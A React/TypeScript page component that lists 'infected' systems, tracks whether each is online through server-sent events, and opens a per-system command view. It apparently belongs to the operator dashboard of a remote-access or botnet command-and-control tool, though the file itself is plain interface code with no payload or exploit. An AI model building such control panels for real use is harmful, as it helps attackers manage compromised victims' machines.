import React, { useEffect, useState } from "react"
import { useLocation, useNavigate } from "react-router";
import type { Infected } from "../types/infected.ts";
import api from "../api/baseUrl.ts";
import { InfectedCard } from "../components/InfectedCard.tsx";
import { useTitle } from "../hooks/useTitle.ts";
import { useStore } from "../hooks/useStore.ts";
import type { InfectedStatus } from "../sse.ts";

export const InfectedPage: React.FC = () => {
    const navigate = useNavigate();
    const { infected, setInfected } = useStore();
    const { loggedIn } = useStore();

    useTitle("InfectedPage");

    const obtainAllInfectedSystems = async () => {
        if (loggedIn) {
            const response = await api.get("/infected/allInfected");
            setInfected(response.data as Infected[]);
            console.log(response.data)
        }
    }

    const command = (infected: Infected) => {
        console.log(infected.latestIpAddress);
        if (infected.online) {
            navigate(`/infected/${infected.iid}`)
        }
        else {
            console.log(`Infected ${infected.iid} is offline!`);
        }
    }

    /**
     * Checks if the user made login, before entering this page
     */

    useEffect(() => {
        const sseHandler = ((e: CustomEvent) => {
            const { detail: infectedStatus }: { detail: InfectedStatus } = e;
            let exists = false;

            setInfected(prev => prev.map(infected => {
                if (infected.iid == infectedStatus.iid) {
                    exists = true;
                    return {
                        ...infected,
                        online: infectedStatus.online
                    }
                }

                return infected;
            }))

            if (!exists) {
                obtainAllInfectedSystems();
            }
            console.log("Status updated:", infectedStatus);
        }) as EventListener;

        window.addEventListener('infected-status', sseHandler)

        if (!loggedIn) {
            navigate("/login");
            return;
        }
        obtainAllInfectedSystems();

        return () => {
            window.removeEventListener('infected-status', sseHandler);
        }
    }, []);

    return (
        <>
            <div className="flex flex-row flex-wrap gap-4 p-4">
                {infected?.map((io) =>
                    (<InfectedCard infected={io} command={() => command(io)} key={io.iid} />))}
            </div>
        </>
    )
}
